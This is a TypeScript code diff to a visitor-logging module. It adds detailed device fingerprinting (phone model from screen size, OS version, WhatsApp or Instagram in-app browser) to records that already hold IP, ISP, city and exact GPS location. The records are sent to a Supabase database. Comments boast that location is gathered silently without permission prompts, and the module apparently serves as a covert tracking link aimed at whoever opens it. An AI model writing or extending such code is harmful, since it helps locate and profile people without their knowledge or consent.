@@ -8,6 +8,8 @@ export interface VisitLog {
   region: string;
   country: string;
   device: string;
+  screenSize?: string;
+  osVersion?: string;
   accuracyType?: 'GPS (Exact)' | 'IP (Approximate)';
   isp?: string;
   ip?: string;
@@ -32,6 +34,89 @@ interface LocationData {
   country: string;
   accuracyType: 'GPS (Exact)' | 'IP (Approximate)';
   isp?: string;
+}
+
+export interface DeviceDetails {
+  deviceSummary: string;
+  screenSize: string;
+  browserName: string;
+  osVersion: string;
+}
+
+export function detectDetailedDevice(): DeviceDetails {
+  const ua = navigator.userAgent;
+  const width = window.screen.width || window.innerWidth;
+  const height = window.screen.height || window.innerHeight;
+  const dpr = window.devicePixelRatio || 1;
+  const screenSize = `${width}x${height} px (@${dpr}x)`;
+
+  // Detect App / Webview Context
+  let appName = '';
+  if (/WhatsApp/i.test(ua)) appName = ' (WhatsApp App)';
+  else if (/Instagram/i.test(ua)) appName = ' (Instagram App)';
+  else if (/FBAN|FBAV/i.test(ua)) appName = ' (Facebook App)';
+  else if (/Snapchat/i.test(ua)) appName = ' (Snapchat App)';
+
+  // Detect Browser
+  let browserName = 'Browser';
+  if (/CriOS|Chrome/i.test(ua) && !/Edge|OPR/i.test(ua)) browserName = 'Chrome';
+  else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browserName = 'Safari';
+  else if (/Firefox|FxiOS/i.test(ua)) browserName = 'Firefox';
+  else if (/Edg/i.test(ua)) browserName = 'Edge';
+
+  // Detect OS Version
+  let osVersion = 'Unknown OS';
+  const iosMatch = ua.match(/OS (\d+_\d+(_\d+)?)/i);
+  if (iosMatch) {
+    osVersion = `iOS ${iosMatch[1].replace(/_/g, '.')}`;
+  } else {
+    const androidMatch = ua.match(/Android (\d+(\.\d+)?)/i);
+    if (androidMatch) {
+      osVersion = `Android ${androidMatch[1]}`;
+    } else if (/Macintosh/i.test(ua)) {
+      osVersion = 'macOS';
+    } else if (/Windows/i.test(ua)) {
+      osVersion = 'Windows PC';
+    }
+  }
+
+  // Detect Specific Mobile Model based on UA and Resolution
+  let deviceSummary = 'Desktop PC';
+
+  if (/iphone/i.test(ua)) {
+    let model = 'iPhone';
+    if ((width === 393 && height === 852) || (width === 852 && height === 393)) model = 'iPhone 16 / 15 Pro / 14 Pro';
+    else if ((width === 430 && height === 932) || (width === 932 && height === 430)) model = 'iPhone 16 Plus / 15 Pro Max';
+    else if ((width === 390 && height === 844) || (width === 844 && height === 390)) model = 'iPhone 14 / 13 / 12';
+    else if ((width === 428 && height === 926) || (width === 926 && height === 428)) model = 'iPhone 14 Plus / 13 Pro Max';
+    else if ((width === 375 && height === 812) || (width === 812 && height === 375)) model = 'iPhone 13 mini / 12 mini / X';
+    else if ((width === 414 && height === 896) || (width === 896 && height === 414)) model = 'iPhone 11 / XR / XS Max';
+    else if ((width === 375 && height === 667) || (width === 667 && height === 375)) model = 'iPhone SE / 8';
+
+    deviceSummary = `${model}${appName || ` (${browserName})`}`;
+  } else if (/ipad/i.test(ua)) {
+    deviceSummary = `iPad Tablet${appName || ` (${browserName})`}`;
+  } else if (/android/i.test(ua)) {
+    let brand = 'Android Phone';
+    if (/samsung/i.test(ua)) brand = 'Samsung Galaxy';
+    else if (/oneplus/i.test(ua)) brand = 'OnePlus';
+    else if (/pixel/i.test(ua)) brand = 'Google Pixel';
+    else if (/xiaomi|mi|redmi|poco/i.test(ua)) brand = 'Xiaomi / Redmi';
+    else if (/vivo/i.test(ua)) brand = 'Vivo';
+    else if (/oppo/i.test(ua)) brand = 'Oppo';
+    else if (/realme/i.test(ua)) brand = 'Realme';
+
+    deviceSummary = `${brand}${appName || ` (${browserName})`}`;
+  } else if (/mobile/i.test(ua)) {
+    deviceSummary = `Mobile Browser${appName}`;
+  }
+
+  return {
+    deviceSummary,
+    screenSize,
+    browserName: appName ? appName.trim().replace(/[()]/g, '') : browserName,
+    osVersion,
+  };
 }
 
 function getOrCreateVisitorId(): string {
@@ -166,13 +251,7 @@ export async function requestExactGPSLocation(): Promise<boolean> {
     const prevCountStr = localStorage.getItem('dimpi_visit_count');
     const visitCount = prevCountStr ? parseInt(prevCountStr, 10) : 1;
     const now = Date.now();
-
-    const ua = navigator.userAgent;
-    let device = 'Desktop';
-    if (/android/i.test(ua)) device = 'Android Mobile';
-    else if (/iphone/i.test(ua)) device = 'iPhone';
-    else if (/ipad/i.test(ua)) device = 'iPad Tablet';
-    else if (/mobile/i.test(ua)) device = 'Mobile Browser';
+    const dev = detectDetailedDevice();
 
     const gpsLog: VisitLog = {
       id: now.toString(),
@@ -186,7 +265,9 @@ export async function requestExactGPSLocation(): Promise<boolean> {
       city,
       region: `${region} (Exact GPS)`,
       country,
-      device,
+      device: dev.deviceSummary,
+      screenSize: dev.screenSize,
+      osVersion: dev.osVersion,
       accuracyType: 'GPS (Exact)',
       mapsUrl,
     };
@@ -217,6 +298,8 @@ async function postToSupabase(log: VisitLog): Promise<void> {
       region: log.region,
       country: log.country,
       device: log.device,
+      screen_size: log.screenSize || '',
+      os_version: log.osVersion || '',
       accuracy_type: log.accuracyType || 'IP (Approximate)',
       isp: log.isp || '',
       maps_url: log.mapsUrl || '',
@@ -260,6 +343,8 @@ async function fetchFromSupabase(): Promise<VisitLog[]> {
           region: item.region || 'Unknown Region',
           country: item.country || 'Unknown Country',
           device: item.device || 'Mobile',
+          screenSize: item.screen_size || item.screenSize || '',
+          osVersion: item.os_version || item.osVersion || '',
           accuracyType: item.accuracy_type || item.accuracyType || 'IP (Approximate)',
           isp: item.isp || '',
           mapsUrl: item.maps_url || item.mapsUrl || '',
@@ -304,13 +389,8 @@ export async function logVisitSilent(force: boolean = false): Promise<void> {
       }
     }
 
-    // Detect device type
-    const ua = navigator.userAgent;
-    let device = 'Desktop';
-    if (/android/i.test(ua)) device = 'Android Mobile';
-    else if (/iphone/i.test(ua)) device = 'iPhone';
-    else if (/ipad/i.test(ua)) device = 'iPad Tablet';
-    else if (/mobile/i.test(ua)) device = 'Mobile Browser';
+    // Detect detailed device specs & mobile view
+    const dev = detectDetailedDevice();
 
     // Fetch Location Data silently in background (No browser permission popups!)
     const loc = await getSilentLocation();
@@ -327,7 +407,9 @@ export async function logVisitSilent(force: boolean = false): Promise<void> {
       city: loc.city,
       region: loc.region,
       country: loc.country,
-      device,
+      device: dev.deviceSummary,
+      screenSize: dev.screenSize,
+      osVersion: dev.osVersion,
       accuracyType: loc.accuracyType,
       isp: loc.isp,
     };
